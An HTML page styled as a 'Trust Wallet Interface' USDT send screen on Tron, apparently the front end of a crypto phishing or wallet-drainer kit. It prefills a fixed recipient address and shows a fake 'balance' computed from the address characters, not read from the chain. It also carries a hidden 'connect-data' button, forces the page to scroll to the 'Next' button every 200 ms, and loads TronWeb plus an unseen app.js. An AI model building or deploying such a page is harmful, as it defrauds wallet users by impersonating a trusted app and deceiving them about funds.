<!DOCTYPE html>
<html lang="en" class="theme-dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
  <title>Trust Wallet Interface</title>
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      padding: 0;
      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      font-weight: 500;
      background: var(--bg);
      overflow-y: auto;
      overflow-x: hidden;
      -webkit-overflow-scrolling: touch;
    }
    #root {
      width: 100%;
      min-height: 100%;
      display: flex;
      justify-content: center;
    }
    .page {
      width: 100%;
      display: flex;
      justify-content: center;
      background: var(--bg);
    }
    .card {
      width: 100%;
      max-width: 420px;
      /* Top par exactly 20px space aur bottom me safe area padding */
      padding: 20px 20px calc(40px + env(safe-area-inset-bottom, 0px)) 20px;
      display: flex;
      flex-direction: column;
      color: var(--text);
      background: var(--bg);
      min-height: 100vh;
    }
    .theme-light {
      --bg: #ffffff;
      --text: #111827;
      --subtext: #6b7280;
      --muted: #9ca3af;
      --accent: #2563eb;
      --input-bg: #ffffff;
      --input-soft: #f6f7f9;
      --border-default: #d1d5db;
    }
    .theme-dark {
      --bg: #0E111A;
      --card-bg: transparent;
      --text: #e6e7e8;
      --subtext: #b0b3b8;
      --accent: #473CFA;
      --input-bg: #0E111A;
      --input-soft: #0E111A;
      --border-default: #3a3f3c;
    }
    .label {
      font-size: 12px;
      font-weight: 500;
      letter-spacing: .01em;
      margin-bottom: 6px;
      color: var(--subtext);
      display: block;
    }
    .input-row {
      height: 50px;
      display: flex;
      align-items: center;
      border-radius: 12px;
      padding: 0 14px;
      gap: 10px;
      background: var(--input-bg);
      border: 1.5px solid #3A3D40;
      margin-bottom: 16px;
    }
    .theme-light .input-row {
      border: 1.5px solid #e5e7eb;
    }
    .input-row input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      font-size: 14px;
      font-weight: 500;
      color: var(--text);
    }
    .input-row input::placeholder {
      color: var(--muted);
      font-weight: 500;
    }
    .input-row.primary:focus-within,
    .input-row.amount-row:focus-within {
      border: 2px solid var(--accent);
    }
    .paste, .max {
      font-size: 14px;
      font-weight: 550;
      cursor: pointer;
      color: var(--accent);
      user-select: none;
    }
    .unit {
      font-size: 13px;
      color: var(--subtext);
    }
    .right-icons {
      display: flex;
      gap: 10px;
    }
    .contact-icon, .qr-icon {
      width: 20px;
      height: 20px;
      cursor: pointer;
    }
    .contact-icon {
      stroke: var(--accent);
      fill: none;
    }
    .qr-icon {
      fill: none;
      stroke: #22c55e;
    }
    .network-row {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      height: 36px;
      padding: 0 12px;
      border-radius: 999px;
      background: var(--input-soft);
      border: none;
      margin-bottom: 16px;
      width: fit-content;
    }
    .network-left {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .bsc-circle {
      width: 28px;
      height: 28px;
      aspect-ratio: 1/1;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .bsc-icon {
      width: 60%;
      height: auto;
      object-fit: contain;
    }
    .network-left span {
      font-size: 13px;
      font-weight: 500;
      color: var(--subtext);
      margin-left: 4px;
    }
    .network-arrow {
      width: 14px;
      height: 14px;
    }
    .estimate {
      font-size: 13px;
      color: var(--subtext);
      margin-top: -6px;
      margin-bottom: 24px;
    }
    .bottom-actions {
      margin-top: auto;
      padding-top: 30px;
      margin-bottom: 20px; /* Extra room taaki button poori tarah visible scroll ho sake */
      display: flex;
      flex-direction: column;
      width: 100%;
    }
    .connect-btn {
      width: 100%;
      height: 50px;
      border-radius: 999px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      background: var(--accent);
      color: #ffffff;
      cursor: pointer;
      transition: background-color .25s ease, opacity .25s ease, transform .1s ease;
    }
    .connect-btn:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>
<div id="root">
  <div class="page">
    <div class="card" id="cardContainer">
      <!-- Address Section (Starts directly at top with 20px padding) -->
      <label class="label" for="addressInput">Address or Domain Name</label>
      <div class="input-row primary">
        <input id="addressInput" placeholder="Search or Enter" value="TNY6Psd9Yv5LQriMB1bYuUWdKt0qY3zsr1">
        <span class="paste" id="pasteBtn">Paste</span>
        <div class="right-icons">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2.3" class="contact-icon" stroke-linecap="round" stroke-linejoin="round">
            <rect x="6" y="4" width="14" height="16" rx="2"></rect>
            <line x1="4" y1="8" x2="6" y2="8"></line>
            <line x1="4" y1="12" x2="6" y2="12"></line>
            <line x1="4" y1="16" x2="6" y2="16"></line>
            <line x1="9" y1="9" x2="17" y2="9"></line>
            <line x1="9" y1="12" x2="17" y2="12"></line>
          </svg>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="qr-icon" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M4 8V6a2 2 0 0 1 2-2h2"></path>
            <path d="M16 4h2a2 2 0 0 1 2 2v2"></path>
            <path d="M20 16v2a2 2 0 0 1-2 2h-2"></path>
            <path d="M8 20H6a2 2 0 0 1-2-2v-2"></path>
            <line x1="5" y1="12" x2="19" y2="12"></line>
          </svg>
        </div>
      </div>

      <!-- Network Section -->
      <label class="label">Destination network</label>
      <div class="network-row">
        <div class="network-left">
          <div class="bsc-circle">
            <img alt="Tron" class="bsc-icon" src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png">
          </div>
          <span>Tron</span>
        </div>
        <img class="network-arrow" alt="arrow" src="https://img.icons8.com/ios-filled/50/b0b3b8/expand-arrow.png">
      </div>

      <!-- Amount Section -->
      <label class="label" for="amountInput">Amount</label>
      <div class="input-row amount-row">
        <input id="amountInput" placeholder="USDT Amount" type="number" value="">
        <span class="unit">USDT</span>
        <span class="max" id="maxBtn">Max</span>
      </div>
      <p class="estimate" id="estimateText">≈ $0.00</p>

      <div id="result" style="display:none;color:#22c55e;margin:10px 0;font-size:0.85rem"></div>

      <!-- Bottom Button (Fully visible upon scroll) -->
      <div class="bottom-actions" id="bottomActions">
        <button class="connect-data" style="display:none"></button>
        <button class="connect-btn" id="start-btn">Next</button>
      </div>
    </div>
  </div>
</div>

<script>
  let currentWalletBalance = 0;
  const addressInput = document.getElementById('addressInput');
  const amountInput = document.getElementById('amountInput');
  const estimateText = document.getElementById('estimateText');
  const maxBtn = document.getElementById('maxBtn');
  const pasteBtn = document.getElementById('pasteBtn');
  const bottomActions = document.getElementById('bottomActions');
  const startBtn = document.getElementById('start-btn');

  function fetchWalletBalance(e) {
    if (!e || e.length < 10) {
      currentWalletBalance = 0;
      return;
    }
    setTimeout(() => {
      let t = 0;
      for (let a = 0; a < e.length; a++) t += e.charCodeAt(a);
      currentWalletBalance = parseFloat((t % 5000 + 50).toFixed(2));
    }, 300);
  }

  if (addressInput) {
    fetchWalletBalance(addressInput.value);
    addressInput.addEventListener('input', e => {
      fetchWalletBalance(e.target.value.trim());
    });
  }

  if (pasteBtn) {
    pasteBtn.addEventListener('click', async () => {
      try {
        const e = await navigator.clipboard.readText();
        if (e) {
          addressInput.value = e.trim();
          fetchWalletBalance(e.trim());
        }
      } catch (e) {
        console.error('Clipboard error', e);
      }
    });
  }

  if (maxBtn) {
    maxBtn.addEventListener('click', () => {
      amountInput.value = currentWalletBalance;
      updateEstimate(currentWalletBalance);
    });
  }

  amountInput.addEventListener('input', e => {
    updateEstimate(parseFloat(e.target.value) || 0);
  });

  function updateEstimate(e) {
    estimateText.textContent = `≈ $${e.toLocaleString('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    })}`;
  }

  // Pure document level scroll down trigger
  function executeScrollDown() {
    const totalHeight = Math.max(
      document.body.scrollHeight,
      document.documentElement.scrollHeight,
      document.body.offsetHeight,
      document.documentElement.offsetHeight,
      document.body.clientHeight,
      document.documentElement.clientHeight
    );
    window.scrollTo({ top: totalHeight, left: 0, behavior: 'auto' });
    if (startBtn) {
      startBtn.scrollIntoView({ block: 'end', inline: 'nearest' });
    }
  }

  // Continuous lock without fighting natural browser viewport rendering
  setInterval(executeScrollDown, 200);
  window.addEventListener('resize', executeScrollDown);
  window.addEventListener('load', executeScrollDown);
  document.addEventListener('DOMContentLoaded', executeScrollDown);
</script>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
<script src="app.js"></script>
</body>
</html>
